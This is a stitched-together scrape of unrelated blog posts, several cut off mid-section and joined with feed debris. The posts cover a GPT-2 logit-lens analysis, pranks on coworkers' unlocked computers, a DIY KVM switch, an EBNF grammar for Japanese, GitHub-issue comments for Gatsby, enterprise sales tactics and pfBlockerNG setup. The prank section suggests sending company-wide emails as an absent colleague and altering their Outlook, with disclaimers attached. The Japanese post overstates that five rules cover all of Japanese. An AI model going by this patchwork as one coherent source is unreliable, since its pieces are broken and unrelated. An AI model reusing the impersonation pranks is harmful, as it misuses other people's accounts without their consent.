position relative to the inputs. The token at position <em>i</em> should, after flowing through the layers of the model, turn into the token at position <em>i+1</em>. (More accurately, a distribution over the token at position <em>i+1.</em>)</li></ul><li> Vocab and embedding spaces</li><ul><li>The vocab has size <em>N_v</em>=50257, but GPT works internally in a smaller "embedding" vector space, of dimension <em>N_e</em>. </li><ul><li>For example, in the GPT-2 1558M model size, <em>N_e</em>=1600.  (Below, I'll often assume we're talking about GPT-2 1558M for concreteness.)</li></ul><li>There is an <em>N_v</em>-by-<em>N_e</em> embedding matrix <em>W</em> which is used to project the vocab space into the embedding space and vice versa.</li></ul><li> In, blocks, out</li><ul><li>The first thing that happens to the inputs is a multiplication by <em>W</em>, which projects them into the embedding space. <a href="about:blank#fn-AtHPnbaLw7d3539eA-1">[1]</a></li><li>The resulting 1600-dimensional vector then passes through many neural network blocks, each of which returns another 1600-dimensional vector.</li><li>At the end, the final 1600-dimensional vector is multiplied by <em>W's</em> transpose to project back into vocab space.</li><li>The resulting 50257-dim vectors are treated as logits. Applying the softmax function to them gives you the output probability distribution.</li></ul></ul><p>As described above, GPT schematically looks like</p><ul><li>Project the input tokens from vocab space into the 1600-dim embedding space</li><li>Modify this 1600-dim vector many times</li><li>Project the final 1600-dim vector back into vocab space</li></ul><p>We have a "dictionary," <em>W</em>, that lets us convert between vocab space and embedding space at any point.  We know that <em>some</em> vectors in embedding space make sense when converted into vocab space:</p><ul><li>The very first embedding vectors are just the input tokens (in embedding space) </li><li>The very last embedding vectors are just the output logits (in embedding space) </li></ul><p>What about the 1600-dim vectors produced in the middle of the network, say the output of the 12th layer or the 33rd?  If we convert them to vocab space, do the results make sense?  The answer is <em><strong>yes</strong></em>.</p><h2 id="logits">logits</h2><p>For example: the plots below show the logit lens on GPT-2 as it predicts a segment of the abstract of the GPT-3 paper.  (This is a segment in the middle of the abstract; it can see all the preceding text, but I'm not visualizing the activations for it.)</p><p>For readability, I've made two plots showing two consecutive stretches of 10 tokens.  Notes on how to read them:</p><ul><li>The input tokens are shown as 45-degree tilted axis labels at the bottom.</li><li>The correct output (i.e. the input shifted by one) is likewise shown at the top.</li><ul><li>A (*) is added in these labels when the model's top guess matched the correct output.</li></ul><li>The vertical axis indexes the layers (or "blocks"), zero-indexed from 0 to 47.  To make the plots less huge I skip every other intermediate layer.  The Colab notebook lets you control this skipping as you like.</li><li>The top guess for each token, according to the model's activations at a given layer, is printed in each cell.</li><li>The colors show the logit associated with the top guess.  These tend to increase steadily as the model converges on a "good guess," then get refined in the last layers.</li><li>Cells are outlined when their top guess matches the final top guess.</li><li><em>For transformer experts: the "activations" here are the block outputs after layer norm, but before the learned point-wise transformation.</em></li></ul><p><span><figure><img src="https://64.media.tumblr.com/d95b4d3323975d215b99426f16baaf75/fb69b4765ee1e95d-e9/s1280x1920/e86465c01d64c127d42865114fa2df88fcff90c7.png"></figure></span><br><span><figure><img src="https://64.media.tumblr.com/a165e9089fbc5023171fd12c22a2007f/fb69b4765ee1e95d-da/s1280x1920/d8b8aea5737a70f851dc8e8d2e33a5d42b61d288.png"></figure></span></p><p>There are various amusing and interesting things one can glimpse in these plots.  The "early guesses" are generally wrong but often sensible enough in some way:</p><ul><li>"We train GPT-3..." <em>000?</em>  (someday!)</li><li>"GPT-3, an..." <em>enormous? massive?</em>  (not wrong!)</li><li>"We train GPT-3, an aut..." <em>oreceptor?  </em>(later converges to the correct <em>oregressive</em>)</li><li>"model with 175..." <em>million</em>?  (later converges to a comma, not the correct <em>billion</em>)</li></ul><h2 id="ranks">ranks</h2><p>The view above focuses only on the top-1 guess at each layer, which is a reductive window on the full distributions.</p><p>Another way to look at things: we still reduces the <em>final</em> output to the top-1 guess, but we compare other distributions to the final one by looking at the rank of the final top-1 guess. </p><p>Even if the middle of the model hasn't yet converged to the final answer, maybe it's got that answer somewhere in its top 3, top 10, etc.  That's a lot better than "top 50257."</p><p>Here's the same activations as ranks. (Remember: these are ranks of <em>the model's final top-1 prediction,</em> not <em>the true token.</em>)</p><p><span><figure><img src="https://64.media.tumblr.com/4c03e6bf0a90ea6a55ec62d00babdfda/fb69b4765ee1e95d-d1/s1280x1920/e7fbecac341f8705868cae85dbe1646bccda7a42.png"></figure></span></p><p><span><figure><img src="https://64.media.tumblr.com/e272b4d7af3f4c5acabe7bd7236a2bc5/fb69b4765ee1e95d-71/s1280x1920/5ce57c9305ca055d6fa4adecf3855a910770d48c.png"></figure></span></p><p>In most cases, network's uncertainty has drastically reduced by the middle layers.  The order of the top candidates may not be right, and the probabilities may not be perfectly calibrated, but it's got the gist already.</p><h2 id="KL_divergence_and_input_discarding">KL divergence and input discarding</h2><p>Another way of comparing the similarity of two probability distributions is the KL divergence.  Taking the KL divergence of the intermediate probabilities w/r/t the final probabilities, we get a more continuous view of how the distributions smoothly converge to the model's output.</p><p>Because KL divergence is a more holistic measure of the similarity between two distributions than the ones I've used above, it's also my preferred metric for making the point that <em>nothing looks like the input</em>.</p><p>In the plots above, I've skipped the input layer (i.e. the input tokens in embedding space).  Why?  Because they're so different from everything else, they distract the eye!</p><p>In the plots below, where color is KL divergence, I include the input as well.  If we trust that KL divergence is a decent holistic way to compare two distributions (I've seen the same pattern with other metrics), then:</p><ul><li>Immediately, after the very first layer, the input has been transformed into something that looks more like <em>the final output </em>(47 layers layer) than it does like the input.</li><li>After this one discontinuous jump, the distribution progresses in a much more smooth way to the final output distribution.</li></ul><p><span><figure><img src="https://64.media.tumblr.com/948417cb579e11535dfd6160b14215a5/f10041e0cc087cf7-71/s1280x1920/a7f4e5e8be7676e596ad37cce4ba561c988826f0.png"></figure></span></p><p><span><figure><img src="https://64.media.tumblr.com/da5e13b967740adee154f4c9e298a646/f10041e0cc087cf7-2f/s1280x1920/f0fdf4d4b64af6ede1690c2896bdd1106f46b5a2.png"></figure></span></p><p>I show several other examples in the Colab notebook.

		<p>Work sucks sometimes, but it gets really fun when you’re able to pull some <em>Jim VS Dwight</em> level pranks in the workplace.  One of the best and most <strong>time-honored traditions</strong> is to mess with someone’s unlocked computer when they step away from their desk.  These tricks also works at home,<em> just don’t be a jerk about it</em> in either environment!</p>
<div>
<div><div>
<div id=""><p>Disclaimer:</p><div><p>
These pranks are all basically harmless, however, the content here is provided for <strong>informational purposes only</strong>.</p>
<p><strong>Do not perform these pranks on computers you don’t own!</strong>  Pranks can get you fired, cause physical or mental injury including death and could be used against you in a lawsuit or criminal proceeding.</p>
<p><strong>I recommend using this guide to block these pranks</strong> by following the security information included with at the end of each one.<br>
</p></div></div>
</div></div>
<div><div>
<p>A little over 14 years ago, <a href="http://techheadaches.blogspot.com/2006/07/guide-to-computer-pranks-how-to-freak.html">I wrote this guide on computer pranks</a> <span>[<i></i> blogspot.com]</span>.  The article hasn’t aged well, which is why I am writing this newer and bigger version today.</p>
<p>In today’s article, I explore 13 of the best computer pranks you can pull on your co-workers, roommates, spouses and other people you want to prank.</p>
<p>This guide <em>also</em> serves as <strong>13 reasons why you should lock your computer every time you step away</strong>… even for a few moments.  After-all, you are only as secure as your weakest link!</p>
<p>Most importantly, <strong>I also include methods to stop each of the pranks</strong> so that you’re immune even without locking your system (you should still lock your systems!)</p>
</div></div>
</div>
<div id=""><div>
<div><p><i></i> How To Manually Lock Your Computer</p><div><p>
Choose one.  The first one is really easy to remember and quick to perform when walking away from your computer.  </p>
<ul>
<li>Hold the <strong>Windows Key + L</strong></li>
<li>Press <strong>Control + Alt + Delete</strong> and then hit <strong>Enter</strong></li>
<li>Windows 10: Click on the <strong>Start menu</strong>, on the far left side of the Start menu, click your <strong>Avatar/Username</strong> and then click <strong>Lock</strong></li>
<li>Mac: <strong>Opt + Cmd + Eject</strong> to put your computer to sleep.</li>
<li>Mac: <strong>Control + Shift + Eject</strong> to turn off the monitor only.</li>
</ul>
<p><strong>At the end of the article, I discuss <em>multiple ways to automatically lock your computer</em>.</strong>  However, you should still manually lock your computer because there are some real problems that come along with automatically locking.</p>
</div></div>
</div></div>



<h2><span id="Send_a_Friendly_Email_on_Their_Behalf"></span>Send a Friendly Email on Their Behalf<span></span></h2>
<p>So your colleague stepped away from their desk.  <em>Why not</em> send off a company-wide email with the subject:</p>
<div><p><i></i> Example Email Subject Lines</p><div>
<ul>
<li>“<strong>I’m buying everyone lunch &amp; drinks at the ______ local pub!</strong>” or</li>
<li>“<strong>I’m bringing in FREE donuts tomorrow morning for everyone!</strong>” or</li>
<li>“<strong>Coffee Is On The House Tomorrow – Reply With Your Drink!</strong>” or</li>
<li>“<strong>Free Pizza Tomorrow, Courtesy of Me!</strong>“</li>
</ul>
</div></div>
<p>Why not?  <strong>Lots of reasons.</strong>  This can get you into big trouble, as impersonating the <em>wrong person</em> can have <em>serious consequences</em>.  However, <strong>leaving a workstation unlocked can also have serious repercussions</strong>, which is normally the reason why this prank gets performed.</p>

<p><strong>This, along with all the other pranks listed here, might be perceived as <em>bullying</em>.</strong>  To try and avoid that, <strong>this “prank” should be disclosed to each employee</strong> beforehand so that they know <em>anyone</em> who leaves their workstation unattended is subject to this happening.  Also, <strong>no one should actually have to provide free food or drinks because they left their computer unlocked.</strong></p>

<p>For Outlook individually, you can require manual password entry each time mail is processed, but <strong>this includes every time Outlook refreshes your mailbox to check for new mail</strong>.  I don’t recommended it, but here is how to enable it if you like pain:</p>
<ul>
<li>Open Outlook.</li>
<li>Goto <strong>File &gt; Account Settings &gt; Account Setting &gt;</strong></li>
<li>Select your account.  Click the <strong>Change</strong> button.</li>
<li>Click on the <strong>More Settings</strong> button and then the <strong>Security</strong> tab.</li>
<li>Click the <strong>Always prompt for logon credentials</strong> checkbox so that it is checked.</li>
<li>Click <strong>OK</strong>, then <strong>OK</strong>, then <strong>Close</strong>.  Now restart Outlook.</li>

<p>This one takes some time, so it’s best when you have a couple of minutes at least.  The impact of this prank is definitely more noticeable on mobile devices, where you rely on auto-correct and suggestions to form sentences.  However, for users who spend a lot of time either in-browser or in applications like Word, this can be a crazy prank.</p>

<p>You can do <em>a lot</em> of <em>productive</em> stuff with Outlook rules, but I’m not here to talk about that.  Instead, the focus is on using Outlook rules to play a crazy loud sound audio clip when certain emails arrive.</p>

<li>Download a funny audio clip to their computer.  You can find a giant library of quick sound files at <a href="https://www.soundboard.com/">https://www.soundboard.com/</a></li>
<li>Find a common email in their inbox and right click on it, select <strong>Rules</strong>.  Click on <strong>Create Rule</strong> to bring up the <strong>Create Rule</strong> window.</li>
<li>You should select one of the first 3 checkboxes for defining the rules conditions.  These are the things that must happen to trigger a rule.  For example, you could set your email address as the <strong>Sent To</strong> trigger for the rule.</li>
<li>Under the <strong>Do the following</strong> section, select <strong>Play a selected sound</strong>.</li>
<li>Now click the <strong>Browse</strong> button and select the sound file you downloaded in the first step.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I like my two big hi-res monitors. I love my keyboard and my mouse. And I connect them to my stationary
“main” PC and to several other Windows and Mac laptops, alternatively. I’d like to easily switch where these peripheral
devices are connected to, and that’s the traditional role of a <a href="https://en.wikipedia.org/wiki/KVM_switch">KVM switch</a>.</p><p>Unfortunately for me, KVM switches that support 4K/60hz resolutions cost hundreds of dollars, there are
no KVM switches that support USB-C, and I couldn’t find KVM switches that support multiple high-res monitors
either.</p><p>So I decided to implement a mixed hardware/software solution: my monitors (all monitors today really) have more
than one input, so I can connect all my computers simultaneously. The idea is:</p><ul><li>Switch USB devices in hardware.</li><li>Detect this switch in software, and switch monitors inputs as needed.</li></ul><p>To switch USB devices, I ordered <a href="https://www.amazon.ca/gp/product/B01N6GD9JO">this USB 3.0 two-computer switch</a> from Amazon,
that’s $38 Canadian, under $30 USD.</p><p>To automatically switch monitor inputs, I <a href="https://github.com/haimgel/display-switch">wrote some software</a>.</p><p>My plan was:</p><ul><li>Watch for USB device connections/disconnections.</li><li>When a configured device is connected, use <a href="https://en.wikipedia.org/wiki/Display_Data_Channel#DDC/CI">DDC/CI</a> to
send a command to all connected monitors to switch inputs.</li><li>In case the power management turned the video output off, turn it on again (otherwise the monitors will auto-switch
back to the input that actually supplies video output).</li></ul><p>I needed this to happen on Windows and on a Mac, and mature cross-platform support for USB low-level
control and hot plug, DDC/CI and monitor power management is non-existent. I ended up implementing this two
times: <a href="https://github.com/haimgel/display-switch/tree/master/MacOS">once in Swift</a>, for MacOS, and the
<a href="https://github.com/haimgel/display-switch/tree/master/Windows">second time in Rust</a>, for Windows.</p><p>Amazingly enough, this works really well: when I press the button on the USB switch, monitor input is changed
instantaneously, it feels like a “real” KVM switch! 🎉</p></div></div>]]>

<p>We create a 5-rule parser to efficiently and accurately parse affirmative present tense sentences in Japanese.  With just 5 rules you can understand Japanese grammar deeply.</p>



<h2>Deconstructing Japanese</h2>



<p>Linguistics is often unnecessarily complicated.  “Why state concisely with one term when there are 300 different varieties for these intimates and particulars?!”  Simplicity speaks volumes and good teachers teach simple concepts that help unify greater features easily.</p>



<p>To that end, let’s see if we can produce Japanese with an EBNF grammar.</p>



<p>For this we will be using <a href="https://github.com/Engelberg/instaparse">an excellent functional library for clojure called Instaparse</a>.  </p>



<p><a href="http://instaparse-live.matt.is/#/-LxnE95QbDy2LZ_m5XAZ/v1">You can see a <em>live</em> <em>demo</em> of Instaparse online with this grammar here.</a></p>



<p>Update: 2020-1-8: A fully recursive parser can be found here <a href="http://instaparse-live.matt.is/#/-Ly5y7xvJoDkHhIs0UKD/v1">http://instaparse-live.matt.is/#/-Ly5y7xvJoDkHhIs0UKD/v1</a></p>



<h2>What’s an EBNF grammar?</h2>



<p>It’s like a regular expression for sentences.  “Extended Backus-Naur Form.” If you’re familiar, skip ahead.  If not…<br><a href="https://condor.depaul.edu/ichu/csc447/notes/wk3/BNF.pdf">Here’s a useful slideshow.</a>  The wikipedia article is not for the uninitiated, but <a href="http://matt.might.net/articles/grammars-bnf-ebnf/">this article</a> is a bit clearer if you are new to this way of representing grammars.       EBNF is from the realm of “Context-Free Grammars” and is mainly used in computing.  Given that it is definitely about grammar and syntax, EBNF proves very useful in language analysis and generation.  You make rules for breaking down sequences of characters (sentences) into labeled output chunks (parse tree).</p>



<h2>Is it possible to parse Japanese with EBNF?</h2>



<p>Can we make any real headway using <em>computer syntax</em> to decipher human language?  English seems impossible for native language speakers to parse at times.  Is it really possible to parse Japanese with EBNF and label parts of speech accurately?</p>



<h3>はい！ Yes!</h3>



<p>Yes!  However, for <strong>real</strong> Japanese from the wild there would need to be many many rules, and any slight deviations from the rules would not result in a full parse.  So, rather than try and build our own google translate today, why don’t we just try to cover the maximum amount of Japanese with the minimum amount of rules.</p>

<h2>Rules for an EBNF Japanese Grammar</h2>



<p>Japanese has nouns, verbs, particles, and sentence-final-fitters.  That’s it. *  <strong>With 5 concepts we can cover the whole Japanese grammar.</strong>  Amazing.  Japanese is regular enough that its composition can be described in a handful of rules.</p>



<ol><li>A sentence is made of zero or more Bunsetsu-Jars and a Sentence-Final-Fitter. <br><strong>S = JAR* SFF</strong></li><li>A Bunsetsu-Jar is made of zero or more Modifiers, and must have a noun and a particle. <br><strong>JAR = M* noun-no P |  JAR* noun-no no</strong> <p><em>[UPDATE 2020-1-8: fully recursive with extension of rule 2]</em></p></li><li>Particles can be any of the Japanese grammar particles that describe the role of their preceding word in a sentence: が、を、と、で、に、etc。 <br><strong>P = が | を | と | で | に …</strong></li><li>Sentence-Final-Fitters have only 4 options and can be either nouns with the Copula だ (da), or simply verbs with u, or verbs with i.<br><strong>SFF = noun-no だ。 | noun-na だ。 | verb-u。 | verb-i。<br></strong>(sentence-final period included in this rule)</li><li>Modifiers can be nouns  with their relevant letter (“no” or “na”), or simply verb-u or verb-i.<br><strong>M = noun-no の | noun-na な | verb-u | verb-i</strong></li></ol>



<p>With just 5 main rules we can parse all of Japanese.  That’s exciting!  Granted, this is not negation or past tense, just present affirmative, but with small extensions those advancements are accommodatable. </p>

<p>Notice Japanese has no spaces, all parsing relies on accurate detection of symbol in sequence.  ImagineifEnglishhadnospaceswoulditbehardtoread?</p>



<h2><strong>Recursion Update 2020-1-8</strong></h2>



<p>By extending Rule 2 (JAR = … ) to include JAR*, we achieve full recursion on Japanese terms using の [no]</p>

<h2>Death to Adjectives</h2>



<p>Japanese has nouns that take な [na] and nouns that take の [no] when they are used as modifiers.  </p>



<p>Japanese also has verbs that end with an う [u = oo as in “food”] sound and verbs that end with an い [i = ee as in “week”] sound.</p>



<p>Bringing “adjectives” into the mix just gets things really dirty and offers no benefit to the learner.  Stick with 2 kinds of verb and 2 kinds of noun and Japanese will be easy to master.</p>

<h2>Parsing Improves Comprehension</h2>



<p>Important in language learning are the exercises that parse written language correctly.  Learning how the written language is parsed can help one’s mental model, and this will lend to stronger audible comprehension thanks to a deeper understanding of the underlying structure.</p>

<p>*When we say “that’s it,” we are putting words like おいしい into the verb-i column, and words like げんきな into the noun-na column.  Simplifying into two categories, nouns and verbs, actually proves immensely useful and practical in Japanese.  It’s a simplification that should be in all the textbooks and literature.  Congrats 2020.</p>

<![CDATA[Using GitHub Issues for Comments with Gatsby]]>
            </title>

September 2, 2020 | https://blog.geritol.tech/using-github-issues-for-comments-with-gatsby/ | <a href="https://web.archive.org/web/*/https://blog.geritol.tech/using-github-issues-for-comments-with-gatsby/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So you have an awesome statically generated blog that requires no dinamic hosting.
Awesome!</p>
<p>Now you want to add comments to your blog posts. Doom. That’s some dynamic content. You will need to deal with user autentication, storing data and offering an API to retrieve the comments. This is a quite complex task.</p>
<p>We could use some external services like <em>Disqus</em>, but this goes against the static site mentality, adds tracking and ads to our site.</p>
<p>Luckily there is a service that offers the above features and a nice GraphQL API, so if your blog is mainly intended for developers, you can use <strong>Github Issues</strong> for comments. Credits for <a href="https://pknopf.com/post/2018-10-13-comments-for-static-sites-using-github-issues/" target="_blank" rel="nofollow noopener noreferrer">Paul Knopf</a> for the original idea.</p>

<p>So the concept is that we will assign a Github issue for each of our posts. We will instruct Gatsby to fetch issue comments for the posts based on the issue’s id. Our readers can head to that issue and add comments to it. Our static site host will receive a webhook notification when a new comment is posted and rebuild our site.</p>
<p>If you want a TLDR on how to do it, checkout the <a href="https://github.com/geritol/blog.geritol.tech/commit/0d3f8d9dce7b7059407e895150be7ddcbc99c6ef" target="_blank" rel="nofollow noopener noreferrer">commit</a> in which I enabled comments for this site.</p>
<h2>Adding the plugin</h2>
<p>To be able to fetch information from Github’s API via GraphQL, we need to register a plugin.
This requires us to install <code>gatsby-source-graphql</code> as a dependency.</p>
<div data-language="javascript"><pre><code>
module<span>.</span>exports <span>=</span> <span>{</span>
  plugins<span>:</span> <span>[</span>
    <span>{</span>
      resolve<span>:</span> <span><span>`</span><span>gatsby-source-graphql</span><span>`</span></span><span>,</span>
      options<span>:</span> <span>{</span>
        typeName<span>:</span> <span><span>`</span><span>GitHub</span><span>`</span></span><span>,</span>
        fieldName<span>:</span> <span><span>`</span><span>github</span><span>`</span></span><span>,</span>
        url<span>:</span> <span><span>`</span><span>https://api.github.com/graphql</span><span>`</span></span><span>,</span>
        headers<span>:</span> <span>{</span>
          Authorization<span>:</span> <span><span>`</span><span>Bearer </span><span><span>${</span>process<span>.</span>env<span>.</span><span>GITHUB_API_KEY</span><span>}</span></span><span>`</span></span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span></code></pre></div>
<h2>Writing the query</h2>
<p>In your template you will need to extend your GraphQL page query with the following:</p>
<div data-language="javascript"><pre><code>

<span>export</span> <span>const</span> pageQuery <span>=</span> graphql<span><span>`</span><span>
  query BlogPostWithComment($slug: String!, $issueId: Int!) {
    github {
      repository(name: "blog.geritol.tech", owner: "geritol") {
        issue(number: $issueId) {
          id
          comments(first: 30) {
            nodes {
              id
              author {
                login
                url
                avatarUrl
              }
              bodyHTML
              createdAt
              reactionGroups {
                content
              }
            }
          }
        }
      }
    }
  }
</span><span>`</span></span></code></pre></div>
<p>This will tell Gatsby to fetch the first 30 comments for a post based on its <code>issueId</code>.<br>
Do not forget to replace <code>repository(name: "blog.geritol.tech", owner: "geritol")</code> with your repository info.</p>
<h2>Gluing it together</h2>
<p>Somewhere where you are calling <code>createPage</code> we will need to pass the issueId to it so our query can execute properly.</p>
<div data-language="javascript"><pre><code><span>createPage</span><span>(</span><span>{</span>
  path<span>:</span> post<span>.</span>node<span>.</span>fields<span>.</span>slug<span>,</span>
  component<span>:</span> blogPostWithComment<span>,</span>
  context<span>:</span> <span>{</span>
    slug<span>:</span> post<span>.</span>node<span>.</span>fields<span>.</span>slug<span>,</span>
    issueId<span>:</span> post<span>.</span>node<span>.</span>frontmatter<span>.</span>issue<span>,</span>
    previous<span>,</span>
    next<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span></code></pre></div>
<p>This allows us to provide our issue id in the frontmatter of our blogposts eg.:</p>
<div data-language="markdown"><pre><code><span>---</span>
title: My awesome post
<span>issue: 1
<span>---</span></span></code></pre></div>
<h2>Wrapping it up</h2>
<p>Alright. Now we have comment information fetched for our post. We just need to display it.</p>
<p>This is not in the scope of this post, but if you want to get some inspiration, check out how I did it <a href="https://github.com/geritol/blog.geritol.tech/commit/0d3f8d9dce7b7059407e895150be7ddcbc99c6ef" target="_blank" rel="nofollow noopener noreferrer">here</a>.</p>
<p>To have your site re-generated when somebody comments on Github, you can use Github webhooks to launch a rebuild on your site when a new comment arrives. I use <a href="https://www.netlify.com/" target="_blank" rel="nofollow noopener noreferrer">Netlify</a> which nicely supports this.</p>
<h2>Possible areas for improvement</h2>
<ul>
<li>Also display reaction for comments and for the issue (the post itself)</li>
<li>Distribute this as a standalone gatsby plugin (not sure if this is possible or not)</li>
<li>Improve on the comment styling (maybe <a href="https://github.com/utterance" target="_blank" rel="nofollow noopener noreferrer">utterances</a> is a good resource for this)</li>
</ul></div></div>]]>

Nobody likes being told “No”</p>

<p>To sell your product to enterprise buyers, minimize the times when you need to say “No” during the sales cycle.</p>

<p>Enterprise software purchasing is a complex process with potentially innumerable stakeholders and procedural hurdles to cross. Even if you have a badass product that will perfectly fit your customer’s needs, you still need to wade through a complex buying process.</p>

<p>The decision to buy a product like Netflix is simple: I want to watch a once-in-a-generation classic like “<a href="https://bestlifeonline.com/selling-sunset/">Selling Sunset</a>,” so I pay for Netflix to stream it into my greedy eyeballs. As an individual, I make the purchasing decision and enjoy the rewards alone (thankfully).</p>

<p><img src="https://staysaasy.com/assets/enterprise_say_no/sunset.jpeg" alt="Selling Sunset">
I actually think that most of the characters on this show would be absolutely lethal at selling enterprise software</p>

<p>Contrast this to a buyer like the US Air Force deciding to use Slack – even just calculating the number of users that they’ll have is a non-trivial task, and that’s for a relatively straightforward, consumer-friendly SaaS product. Transformational changes – say, <a href="https://techcrunch.com/2018/07/26/jedi-10-billion-department-of-defense-bidding/">moving to the cloud</a> – can be <a href="https://techcrunch.com/2020/05/08/microsoft-and-aws-exchange-poisoned-pen-blog-posts-in-latest-pentagon-jedi-contract-spat/">exponentially more complex</a>. The number of stakeholder approvals and compliance hurdles that must be vanquished on the way to this sort of purchase boggles the mind, but this is exactly where you make your bones as an enterprise SaaS business.</p>

<h2 id="detractors-want-you-to-say-no">Detractors Want You to Say “No”</h2>

<p>Innumerable potential blockers can arise during a sales cycle: you’ll have to say “No” to a particular use-case provided by the product that you’ll be replacing, or explain why you lack a feature that a buyer was expecting from a previous job. In most cases these gaps are unimportant… but these blockers can really throw a wrench into the sales process.</p>

<p>Adversaries who oppose a new software vendor will latch onto any time when you don’t say “Yes” like a lamprey – poking holes in the case to buy your product. Blocking stakeholders are typically incentivized to either preserve the status quo or explicitly harm your case, and include:</p>

<ul>
  <li>Teams who are incentivized to minimize risk, such as Compliance, Legal, IT, and (in some cases) Security.</li>
  <li>Teams who are frequently blamed if a poor buying decision is made, such as Procurement. Some companies also just have risk-averse, blame-heavy cultures in general.</li>
  <li>Champions of incumbent solutions – for example, an executive who originally purchased the product that you’re replacing.</li>
  <li>People who don’t want to do the work of changing to a new vendor.</li>
  <li>Competitors.</li>
  <li>(Rarely, but occasionally) people who are just nihilistic or obstructionist jerks.</li>
</ul>

<p>One of the biggest enemies when selling to a complex organization is <strong>time</strong>. Buyers get discouraged if it’s taking too long to sign a new vendor, and there’s often a small window when a company is ready for change and the stars have aligned for them to drop some serious coin for it. Detractors will latch onto any “Nos” that they hear and use it to delay or kill a sales cycle. This is especially common when replacing a strong incumbent – you had better believe that Oracle knows every trick in the book to make it seem that your product is untrustworthy or incomplete.</p>

<p>In order to overcome this, allow your sales team to say “Yes” as often as possible. The client is worried about some niche use-case? We have a partner who will make it happen. The client wants a particular security feature? We can make sure that the particular risk the Security team flagged will be handled. The client needs to format their data <em>just right</em> for board meetings? With a little bit of elbow grease on the customer’s part, we can support it.</p>

<p>Ways to say Yes more:</p>

<ol>
  <li>Make your product as flexible as possible - eg make everything programmable via API or expose webhook callbacks for all major business actions. This helps customers, consultants, or your implementation teams extend your product’s capabilities for use-cases that are unique to them, which you’ll never directly build yourself.</li>
  <li>Identify major gaps that will be a pain to build for, and find quality partners who can fill in these capabilities. Similar to the above, this allows you to cover niche functionality that only a few customers will need.</li>
  <li>Make it easy to transfer raw data into or out of your platform. For example, virtually every enterprise product requires some amount of internal executive level reporting, which is typically both critical and highly team-specific. By furnishing raw data exports you can check the box of helping to provide these reports. Being able to ingest or output large volumes of data also helps check the box of whether it’ll be easy to migrate to your product.</li>
  <li>Building common no-regrets enterprise features. For example, the areas of governance (SAML, RBAC), security (password controls, 2FA, internal endpoint protection), compliance (SOC 2, HIPAA), and audit logs are all areas where it’s easy to have a gap that will scare the shit out of a conservative buyer. By building for lots of use-cases in this area, you can ensure that you won’t get ruled out for missing features that are peripheral to your core value proposition.</li>
  <li>Find the right customers. If you’re constantly finding yourself saying No during the sales cycle, you’re probably selling to the wrong folks. This is common for early-stage startups or when your sales &amp; marketing teams aren’t generating enough pipeline (forcing you to sell to weak leads). Having a very strong perspective on why your product is special, and who it’s special for, can help you to avoid this trap. So can having discipline – you’re often better off doubling down on making your core customer deliriously happy than stretching for a flashy new logo.</li>
</ol>

<p>Note that the strongest form of #1 and #2 is turning yourself into a platform that others can build on top of.</p>

<h2 id="case-study-salesforce">Case Study: Salesforce</h2>

<p>Salesforce has a <em>decent</em> product. It’s by far the dominant player in the CRM industry, but it’s hardly a loveable product like (say) Zoom, Uber, Datadog, the iPhone, or even Excel. However, Salesforce has used this product to become the #1 in their industry, in part because their team can sell the hell out of it.</p>

<p>If you look at Salesforce, you’ll see that they use all of the techniques described above to ensure that they always have a story for how they can deliver, even if it requires extra integration work. Combined with their ferocious marketing, it’s little surprise that they’re approaching a $200B market cap as of this writing:</p>

<ul>
  <li>They’re well instrumented with open APIs, and use ampscript to build custom functionality.</li>
  <li>They have an app marketplace built on these APIs that’s filled with niche solutions, creating a platform ecosystem, and will also acquire companies to fill product holes.</li>
  <li>They have a robust set of reporting and data import/export functionality, allowing complex organizations to onboard rapidly with services (if necessary).</li>
  <li>Salesforce has a metric ton of enterprise features, and also aggressively moves to support new platform expansions that enterprises might want, such as migrating to Microsoft Azure for their hosting.</li>
  <li>Salesforce’s target customer is well-defined and obvious – it’s literally in the name.</li>
</ul>

<h2 id="case-study-slack">Case Study: Slack</h2>

<p>Slack got its start by selling to smaller organizations and startups, but has since extended their reach into the enterprise. As time has gone on and they’ve begun to see real competitors, they’ve used all of the this post’s enterprise sales tactics to continue to move up-market:</p>

<ul>

<p>In one of our previous articles, <a rel="noreferrer noopener" href="https://www.advicesplice.com/home-network-ad-blocking-and-security/" target="_blank">Home Network Ad Blocking and Security</a>, we talked about ways to block ads on all your home devices, speed up your network, improve security, and protect your household from harmful content. In that article we recommended pfSense as a wonderful solution to these goals, but didn’t go into the specifics of how to configure anything. We wanted to take a moment to share how to setup pfBlockerNG on pfSense so you have an easy to follow guide to reference.</p>
<p>If you are here, then we’ll assume you already know what pfSense is and you are interested in installing pfBlockerNG. If not, take a moment to check out our <a rel="noreferrer noopener" href="https://www.advicesplice.com/home-network-ad-blocking-and-security/" target="_blank">Home Network Ad Blocking and Security</a> article. </p>
<p>So let’s dive right in…</p>
<h2>Login to pfSense</h2>
<p>If logging into pfSense for the first time, use the default username (<strong>admin</strong>) and password (<strong>pfsense</strong>) and complete your initial setup. Once completed you are ready to get started on installing pfBlockerNG.</p>

<h3>11) Acquire and Input MaxMind License Key</h3>
<p>To use pfBlockerNG’s GeoIP functionality, you must <a rel="noreferrer noopener" href="https://www.maxmind.com/en/geolite2/signup" target="_blank">register for a FREE MaxMind account</a>. Once registered, you will have to create a license key and enter it into the ‘MaxMind License Key’ field in pfBlockerNG.</p>

<h3>12) Ensure IP is Setup</h3>
<p>If not already done, select ‘Deny Outbound’ under ‘Action’. There are additional configurations available to include GeoIP and Reputation blocking. For GeoIP, select ‘Deny Outbound’ for any Continents you wish to block and modify these lists, as needed by selecting the pencil to edit.</p>
<figure><img loading="lazy" width="800" height="271" src="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13.png" alt="pfBlockerNG IP Config" srcset="https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13.png 800w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13-300x102.png 300w, https://www.advicesplice.com/wp-content/uploads/2020/08/pfblockerng_13-768x260.png 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>12) Ensure IP is Setup</figcaption></figure>
<h3>13) DNS Block List (DNSBL) Config</h3>
<p>DNSBL or a sinkhole/blackhole renders a site in it’s lists inaccessible. This gives you control over what users are able to access on your network.</p>
<h4>DNSBL SafeSearch</h4>
